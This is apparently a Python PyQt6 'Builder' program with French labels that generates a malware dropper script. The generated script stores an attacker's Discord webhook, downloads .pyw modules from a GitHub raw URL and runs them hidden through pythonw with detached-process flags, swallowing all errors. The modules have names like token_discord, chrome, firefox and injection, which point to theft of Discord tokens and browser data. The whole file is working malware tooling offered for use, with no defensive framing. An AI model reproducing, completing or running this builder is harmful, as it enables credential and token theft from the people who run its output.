from PyQt6.QtWidgets import *
from PyQt6.QtCore import Qt
import sys

base_code = '''
import os, tempfile, requests, subprocess, random, string
webhook = "{WEBHOOK}"
pyw_urls = {
{URLS}
}

def generate_filename():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + ".pyw"

temp = tempfile.gettempdir()
cfg = os.path.join(temp, "config")
whfile = os.path.join(cfg, "webhook.txt")

if not os.path.exists(cfg): os.makedirs(cfg)
if os.path.exists(whfile): os.remove(whfile)
with open(whfile, "w") as f: f.write(webhook)

for url, run in pyw_urls.items():
    path = os.path.join(temp, generate_filename())
    try:
        r = requests.get(url)
        if r.status_code == 200:
            with open(path, "wb") as f: f.write(r.content)
            if run: subprocess.Popen(["pythonw", path], creationflags=0x00000008 | 0x00000200)
    except: pass
'''

class Builder(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Builder")
        self.setFixedSize(450, 500)
        self.setStyleSheet("background:#1e1e1e;color:white;font:10pt Segoe UI;")
        layout = QVBoxLayout(self)

        self.webhook = QLineEdit()
        self.webhook.setPlaceholderText("Webhook")
        self.webhook.setStyleSheet("background:#2e2e2e;padding:6px;border-radius:5px;")
        layout.addWidget(self.webhook)

        self.files = {
            "info_pc": True, "token_discord": True,
            "injection": False, "chrome": False,
            "edge": False, "firefox": False, "opera-GX": False
        }

        self.checkboxes = {}
        for name, default in self.files.items():
            cb = QCheckBox(name)
            cb.setChecked(default)
            cb.setStyleSheet("padding:4px")
            layout.addWidget(cb)
            self.checkboxes[name] = cb

        btn = QPushButton("Générer le fichier")
        btn.setStyleSheet("padding:10px;background:#007acc;border:none;border-radius:5px;color:white;")
        btn.clicked.connect(self.generate)
        layout.addWidget(btn, alignment=Qt.AlignmentFlag.AlignCenter)

    def generate(self):
        webhook = self.webhook.text()
        base_url = "https://raw.githubusercontent.com/theolomo/config/refs/heads/main/"
        urls = ''.join([f'    "{base_url}{name}.pyw": {cb.isChecked()},\n' for name, cb in self.checkboxes.items()])
        code = base_code.replace("{WEBHOOK}", webhook).replace("{URLS}", urls.strip())
        path, _ = QFileDialog.getSaveFileName(self, "Enregistrer", "", "Python File (*.py)")
        if path:
            with open(path, "w", encoding="utf-8") as f: f.write(code)

app = QApplication(sys.argv)
win = Builder()
win.show()
sys.exit(app.exec())
